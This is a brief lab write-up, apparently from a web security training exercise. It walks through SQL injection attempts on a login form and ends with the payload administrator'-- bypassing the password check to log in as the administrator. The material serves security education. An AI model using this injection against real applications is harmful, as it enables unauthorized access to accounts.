**`Vulnerability allowing login bypass`**
**SQL injection: Login functionality**

*- Goal: `Log in to the app as the administrator user`*

*- Analyze:*

1. SELECT * FROM users WHERE username = 'administrator' AND password='admininstrator'
--> return `Invalid username and password`
2. SELECT * FROM users WHERE username = ''' AND password='admininstrator'
--> return error page
3. SELECT * FROM users WHERE username = ''--' AND password='administrator'
--> return `Invalid username and password`
4. SELECT * FROM users WHERE username = 'administrator'--' and password='abcdef'
--> return logged in page

*`LAB SOLVED`*
